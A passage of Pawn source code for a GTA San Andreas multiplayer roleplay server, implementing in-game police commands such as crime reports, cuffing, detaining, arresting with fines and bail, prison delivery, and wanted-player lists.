			}

			format(szMessage, sizeof(szMessage), "You've commited a crime (%s), reporter: %s.", szCrime, GetPlayerNameEx(playerid));
			SendClientMessage(iTargetID, COLOR_LIGHTRED, szMessage);

			format(szMessage, sizeof(szMessage), "Current wanted level: %d", PlayerInfo[iTargetID][pWantedLevel]);
			SendClientMessage(iTargetID, COLOR_YELLOW, szMessage);

			if(AdminDuty[iTargetID] == 0) {
				new
					szCleanDescription[64],
					szQuery[270];

				mysql_escape_string(szCrime, szCleanDescription,64,sqldb);

				mysql_format(sqldb,szQuery, sizeof(szQuery), "INSERT INTO crimes (crimeIssuer, crimeIssuedTo, crimeDescription, crimeIssuerName, crimeIssuedToName) VALUES(%d, %d, '%s', '%s', '%s')", PlayerInfo[playerid][pID], PlayerInfo[iTargetID][pID], szCleanDescription, GetPlayerNameEx(playerid), GetPlayerNameEx(iTargetID));
				mysql_tquery(sqldb,szQuery);
			}
			foreach(Player, i) if(IsACop(i) || PlayerInfo[i][pFaction] == 5 && PlayerInfo[i][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
				format(szMessage, sizeof(szMessage), "HQ: All units APB (reporter: %s)",GetPlayerNameEx(playerid));
				SendClientMessage(i, TEAM_BLUE_COLOR, szMessage);
				format(szMessage, sizeof(szMessage), "HQ: Crime: %s, suspect: %s", szCrime, GetPlayerNameEx(iTargetID));
				SendClientMessage(i, TEAM_BLUE_COLOR, szMessage);
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "You're not a law enforcement officer.");
	return 1;
}

CMD:san(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

		if(IsPlayerInRangeOfPoint(playerid,3.5, 2653.8711, -1833.7297, -38.7244)) {
			ShowPlayerDialogEx(playerid, SAN_DUTYMENU, DIALOG_STYLE_LIST, "SA:News Menu","First Aid Kit\nSafety Vest\nShotgun ($150)\nCamera", "Select", "Cancel");
		} else SendClientMessage(playerid, COLOR_WHITE, "You're not in range of your SAN lockers.");
	}
	return 1;
}

CMD:lspd(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");

		if(IsPlayerInRangeOfPoint(playerid,3.5,255.385696, 77.201263, 1003.640625))
		{
			if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2) ShowPlayerDialogEx(playerid, FDUTYMENU, DIALOG_STYLE_LIST, "FBI Menu","Duty\nEquipment\nSWAT Uniform\nUniform\nUndercover\nClear Suspect", "Select", "Cancel");
			else ShowPlayerDialogEx(playerid, DUTYMENU, DIALOG_STYLE_LIST, "LSPD Menu","Duty\nEquipment\nTactical\nUniform\nUndercover\nClear Suspect", "Select", "Cancel");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "You're not in range of your LSPD lockers.");
		}
	}
	return 1;
}

CMD:mdc(playerid, params[])
{
    if(IsMDCPermitted(playerid))
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
            ShowPlayerDialogEx(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MDC - Logged in", "*Find LEO\n*Civilian Information\n*Law Enforcement Agencies", "OK", "Cancel");
            ConnectedToPC[playerid] = 1337;
        }
        else SendClientMessage(playerid, COLOR_GREY, "You're not in a vehicle.");
    }
    return 1;
}

CMD:detain(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new
			string[128],
			giveplayerid,
			seat;

		if(sscanf(params, "ud", giveplayerid, seat))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /detain [playerid/partofname] [seatid 1-3]");

		if(!IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(IsPlayerInAnyVehicle(playerid))
			return SendClientMessage(playerid, COLOR_GREY, "You can't do this while you're in a vehicle.");

		if(seat < 1 || seat > 3)
			return SendClientMessage(playerid, COLOR_GRAD1, "The seat ID can't be above 3 or below 1.");

		if(IsACop(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "You can't detain other law enforcement officers.");

		if(IsPlayerInAnyVehicle(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "That person is in a car - get them out first.");

		if(giveplayerid == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "You can't detain yourself!");

		if(ProxDetectorS(8.0, playerid, giveplayerid)) {
			if(PlayerCuffed[giveplayerid] == 2) {
				new
					carid = gLastCar[playerid];
				if(IsSeatAvailable(carid, seat)) {
					new Float:pos[6];
					GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
					GetPlayerPos(giveplayerid, pos[3], pos[4], pos[5]);
					GetVehiclePos(carid, pos[0], pos[1], pos[2]);
					if(floatcmp(floatabs(floatsub(pos[0], pos[3])), 10.0) != -1 &&
					floatcmp(floatabs(floatsub(pos[1], pos[4])), 10.0) != -1 &&
					floatcmp(floatabs(floatsub(pos[2], pos[5])), 10.0) != -1) return false;
					format(string, sizeof(string), "* You were detained by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* You detained %s.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s throws %s in the vehicle.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GameTextForPlayer(giveplayerid, "~r~Detained", 2500, 3);
					ClearAnimations(giveplayerid, 1);
					TogglePlayerControllable(giveplayerid, false);
					PutPlayerInVehicle(giveplayerid, carid, seat);
					if(PlayerDraggedBy[giveplayerid] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[giveplayerid]] = INVALID_PLAYER_ID;
						PlayerDragged[giveplayerid] = 0;
						PlayerDraggedBy[giveplayerid] = INVALID_PLAYER_ID;
					}
				} else return SendClientMessage(playerid, COLOR_GREY, "That seat isn't available!");
			} else return SendClientMessage(playerid, COLOR_GREY, "That person isn't cuffed.");
		} else return SendClientMessage(playerid, COLOR_GREY, "You're not close enough to the player or your car!");
	} else SendClientMessage(playerid, COLOR_GRAD2, "   You're not a Cop / FBI / Coastguard!");
	return 1;
}

CMD:bail(playerid, params[])
{
	if(PlayerInfo[playerid][pJailed] == 1 || PlayerInfo[playerid][pJailed] == 2)
	{
		if(JailPrice[playerid] > 0)
		{
			if(GetPlayerCash(playerid) > JailPrice[playerid])
			{
				new string[128];
				format(string, sizeof(string), "You bailed yourself out for $%d.", JailPrice[playerid]);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				GivePlayerCash(playerid, -JailPrice[playerid]);
				JailPrice[playerid] = 0;
				WantLawyer[playerid] = 0; CallLawyer[playerid] = 0;
				PlayerInfo[playerid][pJailTime] = 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "You can't afford the bail price.");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You don't have a bail price.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in jail.");
	}
	return 1;
}

CMD:deliver(playerid, params[]) {
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		if(!IsPlayerInRangeOfPoint(playerid,6.0,1992.484130, -2312.814208, 13.546875))
			return SendClientMessage(playerid, COLOR_GREY, "You're not at the deliver point at the LS airport.");

		if(PlayerInfo[playerid][pRank] < 2)
			return SendClientMessage(playerid, COLOR_GREY, "You must be rank 2 and above to send suspects to prison.");

        new
			suspect = GetClosestPlayer(playerid);

		if(IsPlayerConnected(suspect)) {
			if(ProxDetectorS(15.0, playerid,suspect)) {
				if(PlayerInfo[suspect][pConnectTime] <= 8)
					return SendClientMessage(playerid, COLOR_GREY, "You cannot send a suspect to prison who has 8 or less playing hours.");

				if(PlayerInfo[suspect][pWantedLevel] < 6)
					return SendClientMessage(playerid, COLOR_GREY, "The suspect must have six wanted levels/stars to be taken to normal jail.");

				if(PlayerCuffed[suspect] == 0)
					return SendClientMessage(playerid, COLOR_GREY, "The suspect has not been detained/cuffed.");

				new
					fine,
					allmoney;

				if(PlayerInfo[suspect][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse]][hOwner], true) == 0) {
					allmoney = HouseInfo[PlayerInfo[suspect][pHouse]][hSafeMoney]+GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				} else if(PlayerInfo[suspect][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse2]][hOwner], true) == 0) {
					allmoney += HouseInfo[PlayerInfo[suspect][pHouse2]][hSafeMoney];
				} else {
					allmoney = GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				}

				if(allmoney < 1) {
					fine = 0;
				} else {
					fine = 3*allmoney/100;
				}

				if(fine > 3000) {
					fine = 3000;
				}

				GivePlayerCash(suspect, -fine);
				SetPlayerArmedWeapon(suspect, 0);
            	ResetPlayerWeaponsEx(suspect);

				new string[128];
				format(string, sizeof(string), "* You delivered %s to prison!", GetPlayerNameEx(suspect));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

				format(string, sizeof(string), "You have been prisoned for 40 minutes and fined $%d.   Bail: Unable", fine);
				SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
				if(PlayerDraggedBy[suspect] != INVALID_PLAYER_ID) {
					IsCopDragging[PlayerDraggedBy[suspect]] = INVALID_PLAYER_ID;
					PlayerDragged[suspect] = 0;
					PlayerDraggedBy[suspect] = INVALID_PLAYER_ID;
				}
				PhoneOnline[suspect] = 1;
				DeletePVar(suspect, "IsFrozen");
				PlayerInfo[suspect][pArrested] += 1;
				SetPlayerFree(suspect,playerid, "was arrested");
				PlayerInfo[suspect][pWantedLevel] = 0;
				SetPlayerToTeamColor(suspect);
				SetPlayerWantedLevel(suspect, 0);
				TogglePlayerControllable(suspect, 1);
				ClearAnimations(suspect, 1);
				SetPlayerSpecialAction(suspect, SPECIAL_ACTION_NONE);
				PlayerCuffed[suspect] = 0;
				DeletePVar(suspect, "PlayerCuffed");
				PlayerCuffedTime[suspect] = 0;
				format(PlayerInfo[suspect][pPrisonReason], 128, "Level 6 Wanted [6 stars]");
				format(PlayerInfo[suspect][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));
				PlayCrimeReportForPlayer(playerid, suspect, 6);

				PlayerInfo[suspect][pJailed] = 4;
				PlayerInfo[suspect][pJailTime] = 2400;


				if(PlayerVehicleInfo[suspect][0][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][0][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][1][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][1][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][2][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][2][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][3][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][3][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][4][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][4][pvTicket] = 0;
				}

				GameTextForPlayer(suspect, "~w~Welcome to ~n~~r~ Prison", 5000, 3);
		    	LoadObjectsForPlayer(suspect);
				SetPlayerInterior(suspect, 69);
				PlayerInfo[suspect][pVW] = 696969;
				PlayerInfo[suspect][pInt] = 69;
				SetPlayerVirtualWorld(suspect, 696969);
				new rand = random(sizeof(AdminPrisonFloat));
				SetPlayerPos(suspect, AdminPrisonFloat[rand][0], AdminPrisonFloat[rand][1], AdminPrisonFloat[rand][2]);
				SetPlayerSkin(suspect, 50);
				SetPlayerColor(suspect, TEAM_ORANGE_COLOR);

				if(IsPlayerAttachedObjectSlotUsed(suspect, 0))
					RemovePlayerAttachedObject(suspect, 0);
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not a Cop / FBI!");
	}
	return 1;
}

CMD:grab(playerid, params[]) return cmd_restrain(playerid, params);
CMD:drag(playerid, params[]) return cmd_restrain(playerid, params);
CMD:unrestrain(playerid, params[]) return cmd_restrain(playerid, params);
CMD:restrain(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new id, string[ 128 ];
		if( sscanf( params, "u", id ) )
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /drag [playerid/partofname]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");

		if(GetDistanceBetweenPlayers(id, playerid) > 4)
			return SendClientMessage(playerid, COLOR_GREY, "You're not close enough to the player!");

		if(PlayerCuffed[id] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "That person isn't cuffed.");

		if(PlayerCuffed[id] == 1)
			return SendClientMessage(playerid, COLOR_GREY, "You can't drag a tazed player.");

		if(id == playerid)
			return SendClientMessage(playerid, COLOR_GREY, "You can't restrain yourself!");

		if(GetPlayerState(id) != PLAYER_STATE_ONFOOT)
			return SendClientMessage(playerid, COLOR_GREY, "That person is in a car - get them out first.");

		if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT)
			return SendClientMessage(playerid, COLOR_GREY, "You're in a car - get out first.");

		if(GetPVarInt(playerid, "PBM") > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "You're not able to do this while in a paintball game.");

		if(GetPVarInt(playerid, "EventToken") != 0)
			return SendClientMessage(playerid, COLOR_GREY, "You can't use the tazer while you're in an event.");

		if(PlayerCuffedTime[playerid] > 0)
			return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

		if(GetPVarInt(playerid, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

		if(PlayerInfo[playerid][pJailed] > 0)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't use this in jail/prison.");

		if(PlayerCuffed[playerid] >= 1)
			return SendClientMessage(playerid, COLOR_WHITE, "You can't use this while tazed/cuffed.");

		if(GetPVarInt(id, "Injured") == 1)
			return SendClientMessage(playerid, COLOR_GREY, "You can't cuff injured people.");

		if(PlayerDragged[id] == 1) {
			format(string, sizeof(string), "* %s looks into %s's eyes and then slowly releases them.", GetPlayerNameEx(playerid), GetPlayerNameEx(id));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			GameTextForPlayer(id, "~r~Released!", 2500, 3);
			IsCopDragging[PlayerDraggedBy[id]] = INVALID_PLAYER_ID;
			PlayerDragged[id] = 0;
			PlayerDraggedBy[id] = INVALID_PLAYER_ID;
			DeletePVar(playerid, "Dragging");
		} else {
			if(IsCopDragging[playerid] != INVALID_PLAYER_ID)
				return SendClientMessage(playerid, COLOR_GREY, "You can't drag more than one person.");

			format(string, sizeof(string), "* %s quickly grabs %s by the right arm, restraining them.", GetPlayerNameEx(playerid), GetPlayerNameEx(id));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			GameTextForPlayer(id, "~r~Restrained!", 2500, 3);
			ApplyAnimation(id, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0, 1);
			SetPlayerSpecialAction(id, SPECIAL_ACTION_CUFFED);
			PlayerDragged[id] = 1;
			PlayerDraggedBy[id] = playerid;
			IsCopDragging[playerid] = id;
			SetPVarInt(playerid, "Dragging", id);
		}
	}
	else SendClientMessage(playerid, COLOR_GREY, "   You're not a Cop / FBI!");
	return true;
}

CMD:whereami(playerid, params[]) {
	if(!IsBETAServer())
	    return 1;

	new
	    Float: fPos[3],
	    szMessage[128];

	format(szMessage, sizeof(szMessage), "Saved coordinates: %f %f %f", PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
	SendClientMessage(playerid, COLOR_WHITE, szMessage);

	GetPlayerPos(playerid, fPos[0], fPos[1], fPos[2]);
	format(szMessage, sizeof(szMessage), "Real coordinates: %f %f %f", fPos[0], fPos[1], fPos[2]);
	SendClientMessage(playerid, COLOR_WHITE, szMessage);
	return 1;
}

CMD:arrest(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		if(!IsAtArrestPoint(playerid))
			return SendClientMessage(playerid, COLOR_GREY, "You're not at the arrest point.");

		new
			suspect = GetClosestPlayer(playerid);
		if(IsPlayerConnected(suspect)) {
			if(ProxDetectorS(5.0, playerid, suspect)) {
				new
					allmoney,
					cap,
					string[128],
					moneys,
					time,
					bail,
					bailprice;

				if(PlayerInfo[suspect][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse]][hOwner], true) == 0) {
					allmoney = HouseInfo[PlayerInfo[suspect][pHouse]][hSafeMoney]+GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				} else if(PlayerInfo[suspect][pHouse2] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(suspect), HouseInfo[PlayerInfo[suspect][pHouse2]][hOwner], true) == 0) {
					allmoney += HouseInfo[PlayerInfo[suspect][pHouse2]][hSafeMoney];
				} else {
					allmoney = GetPlayerCash(suspect)+PlayerInfo[suspect][pBank];
				}
				cap = 5*allmoney/100;
				if(cap > 1000 || cap < 1) {
					cap = 1000;
				}

				if(PlayerInfo[suspect][pWantedLevel] < 1) {
					return SendClientMessage(playerid, COLOR_GREY, "The player must have a wanted level of at least one star.");
				} else {
					if(sscanf(params, "dddd", moneys, time, bail, bailprice)) {
						format(string, sizeof(string), "USAGE: /arrest [fine (Max: $%d)] [time (minutes)] [bail (0=no 1=yes)] [bailprice]", cap);
						SendClientMessage(playerid, COLOR_WHITE, string);
						return 1;
					}
				}

				if(time < 1 || time > 20)
				return SendClientMessage(playerid, COLOR_GREY, "Jail time can't be below 1 or above 20 minutes - take the person to prison for more time.");

				if(bail < 0 || bail > 1)
					return SendClientMessage(playerid, COLOR_GREY, "The bail option must be set to 0 or 1.");

				if(bailprice < 0 || bailprice > 1000)
					return SendClientMessage(playerid, COLOR_GREY, "The bail price can't be below $0 or above $1000.");

				if(moneys < 1 || moneys > cap) {
					format(string, sizeof(string), "The jail fine can't be below $1 or above $%d.", cap);
					SendClientMessage(playerid, COLOR_GREY, string);
					return 1;
				}

				format(string, sizeof(string), "* You arrested %s!", GetPlayerNameEx(suspect));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

				GivePlayerCash(suspect, -moneys);
				ResetPlayerWeaponsEx(suspect);
				if(PlayerVehicleInfo[suspect][0][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][0][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][1][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][1][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][2][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][2][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][3][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][3][pvTicket] = 0;
				}
				if(PlayerVehicleInfo[suspect][4][pvTicket] != 0) {
					PlayerVehicleInfo[suspect][4][pvTicket] = 0;
				}
				if(IsPlayerInRangeOfPoint(playerid, 4.0, 1528.082397, -1677.978637, 5.890625) || IsPlayerInRangeOfPoint(playerid, 4.0, 1564.830932, -1652.506469, 28.395606) || PlayerInfo[playerid][pVW] == 20002) {
					SetPlayerInterior(suspect, 6);
					PlayerInfo[suspect][pVW] = 20002;
					PlayerInfo[suspect][pInt] = 6;
					SetPlayerVirtualWorld(suspect, 20002);
					SetPlayerPos(suspect,263.343597, 77.532028, 1001.039062);
					PlayerInfo[suspect][pJailTime] = time * 60;
					PlayerInfo[suspect][pJailed] = 1;
					PhoneOnline[suspect] = 1;
					DeletePVar(suspect, "IsFrozen");
					PlayerInfo[suspect][pArrested] += 1;
					SetPlayerFree(suspect,playerid, "was arrested");
					PlayerInfo[suspect][pWantedLevel] = 0;
					SetPlayerToTeamColor(suspect);
					SetPlayerWantedLevel(suspect, 0);
					WantLawyer[suspect] = 1;
					TogglePlayerControllable(suspect, 1);
					ClearAnimations(suspect, 1);
					SetPlayerSpecialAction(suspect, SPECIAL_ACTION_NONE);
					if(PlayerDraggedBy[suspect] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[suspect]] = INVALID_PLAYER_ID;
						PlayerDragged[suspect] = 0;
						PlayerDraggedBy[suspect] = INVALID_PLAYER_ID;
					}
					PlayerCuffed[suspect] = 0;
					DeletePVar(suspect, "PlayerCuffed");
					PlayerCuffedTime[suspect] = 0;
					PlayCrimeReportForPlayer(playerid, suspect, 6);
					if(IsPlayerAttachedObjectSlotUsed(suspect, 0)) RemovePlayerAttachedObject(suspect, 0);
				}
				else if(IsPlayerInRangeOfPoint(playerid, 4.0, 304.796508, -1526.349731, 76.539062) || IsPlayerInRangeOfPoint(playerid, 4.0, 298.313842, -1536.036865, 24.593750) || PlayerInfo[playerid][pVW] == 1324123) {
					LoadObjectsForPlayer(suspect);
					if(PlayerDraggedBy[suspect] != INVALID_PLAYER_ID) {
						IsCopDragging[PlayerDraggedBy[suspect]] = INVALID_PLAYER_ID;
						PlayerDragged[suspect] = 0;
						PlayerDraggedBy[suspect] = INVALID_PLAYER_ID;
					}
					SetPlayerInterior(suspect, 1);
					PlayerInfo[suspect][pVW] = 1324123;
					PlayerInfo[suspect][pInt] = 1;
					SetPlayerVirtualWorld(suspect, 1324123);
					SetPlayerPos(suspect,315.1677,-1451.5564,-33.5292);

					format(PlayerInfo[suspect][pPrisonReason], 128, "FBI Arrest [%d stars]", PlayerInfo[suspect][pWantedLevel]);
					format(PlayerInfo[suspect][pPrisonedBy], MAX_PLAYER_NAME, "%s", GetPlayerNameEx(playerid));

					PlayerInfo[suspect][pJailTime] = time * 60;
					PlayerInfo[suspect][pJailed] = 2;
					PhoneOnline[suspect] = 1;
					DeletePVar(suspect, "IsFrozen");
					PlayerInfo[suspect][pArrested] += 1;
					SetPlayerFree(suspect,playerid, "was arrested");
					PlayerInfo[suspect][pWantedLevel] = 0;
					SetPlayerToTeamColor(suspect);
					SetPlayerWantedLevel(suspect, 0);
					WantLawyer[suspect] = 1;
					TogglePlayerControllable(suspect, 1);
					ClearAnimations(suspect, 1);
					SetPlayerSpecialAction(suspect, SPECIAL_ACTION_NONE);
					PlayerCuffed[suspect] = 0;
					DeletePVar(suspect, "PlayerCuffed");
					PlayerCuffedTime[suspect] = 0;
					PlayCrimeReportForPlayer(playerid, suspect, 6);
					if(IsPlayerAttachedObjectSlotUsed(suspect, 0)) RemovePlayerAttachedObject(suspect, 0);
				}
				if(bail == 1) {
					JailPrice[suspect] = bailprice;
					format(string, sizeof(string), "You're jailed for %d seconds and fined $%d.   Bail: $%d", PlayerInfo[suspect][pJailTime], moneys, JailPrice[suspect]);
					SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
				} else {
					JailPrice[suspect] = 0;
					format(string, sizeof(string), "You're jailed for %d seconds and fined $%d.   Bail: Unable", PlayerInfo[suspect][pJailTime], moneys);
					SendClientMessage(suspect, COLOR_LIGHTBLUE, string);
				}
			} else SendClientMessage(playerid, COLOR_GREY, "   No-one close enough to arrest.");
		} else SendClientMessage(playerid, COLOR_GREY, "   No-one close enough to arrest.");
	} else SendClientMessage(playerid, COLOR_GREY, "   You're not a Cop / FBI!");
	return 1;
}

CMD:wanted(playerid, params[])
{
	if(IsACop(playerid) || IsInLSFMD(playerid) || PlayerInfo[playerid][pJob] == 2 || PlayerInfo[playerid][pJob2] == 2 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5 || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)
	{
		new string[128], x;

		SendClientMessage(playerid, COLOR_GREEN, "Current Wanted Suspects:");
		foreach(Player, i)
		{
			if(PlayerInfo[i][pWantedLevel] >= 1)
			{
				format(string, sizeof(string), "%s%s: %d", string,GetPlayerNameEx(i),PlayerInfo[i][pWantedLevel]);
				x++;
				if(x > 3) {
					SendClientMessage(playerid, COLOR_YELLOW, string);
					x = 0;
					format(string, sizeof(string), " ");
				} else {
					format(string, sizeof(string), "%s, ", string);
				}
			}
		}
		if(x <= 3 && x > 0)
		{
			string[strlen(string)-2] = '.';
			SendClientMessage(playerid, COLOR_YELLOW, string);
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a Lawyer / Cop / FBI!");
	}
	return 1;
}

CMD:cuff(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2) {
		new
			string[128],
			giveplayerid;

		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /cuff [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid)) {
			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				if(giveplayerid == playerid)
					return SendClientMessage(playerid, COLOR_GREY, "You can't cuff yourself!");

				if(GetPVarInt(giveplayerid, "Injured") == 1)
					return SendClientMessage(playerid, COLOR_GREY, "You can't cuff injured people.");

				if(GetPVarInt(playerid, "Injured") == 1)
					return SendClientMessage(playerid, COLOR_GREY, "You can't do this right now.");

				if(PlayerCuffed[giveplayerid] == 1 || GetPlayerSpecialAction(giveplayerid) == SPECIAL_ACTION_HANDSUP) {
					format(string, sizeof(string), "* You have been handcuffed by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* You handcuffed %s, till uncuff.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s handcuffs %s, tightening the cuffs securely.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					GameTextForPlayer(giveplayerid, "~r~Cuffed", 2500, 3);
					TogglePlayerControllable(giveplayerid, 0);
					ClearAnimations(giveplayerid);
					PlayerCuffed[giveplayerid] = 2;
					SetPVarInt(giveplayerid, "PlayerCuffed", 2);
					SetPVarInt(giveplayerid, "IsFrozen", 1);
					PlayerCuffedTime[giveplayerid] = 300;
     				SetPlayerAttachedObject(giveplayerid, 0, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
         			SetPlayerSpecialAction(giveplayerid, SPECIAL_ACTION_CUFFED);
         			ApplyAnimation(giveplayerid,"ped","cower",1,1,0,0,0,0,1);
				} else return SendClientMessage(playerid, COLOR_GREY, "That player isn't restrained!");
			} else return SendClientMessage(playerid, COLOR_GREY, "That player isn't near you.");
		}else return SendClientMessage(playerid, COLOR_GREY, "Invalid player specified.");
	} else SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	return 1;
}

CMD:uncuff(playerid, params[])
{
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 5) || PlayerInfo[playerid][pFaction] == 5 && PlayerInfo[playerid][pDivision] == 2)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /uncuff [playerid/partofname]");

		if(IsPlayerConnected(giveplayerid))
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(PlayerInfo[giveplayerid][pJailed] >= 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "You can't uncuff a jailed player.");
					return 1;
				}
				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't uncuff yourself."); return 1; }
				if(PlayerCuffed[giveplayerid]>1)
				{
				    PreloadAnims(giveplayerid);
					DeletePVar(giveplayerid, "IsFrozen");
					format(string, sizeof(string), "* You have been uncuffed by %s.", GetPlayerNameEx(playerid));
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* You uncuffed %s.", GetPlayerNameEx(giveplayerid));
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s has uncuffed %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
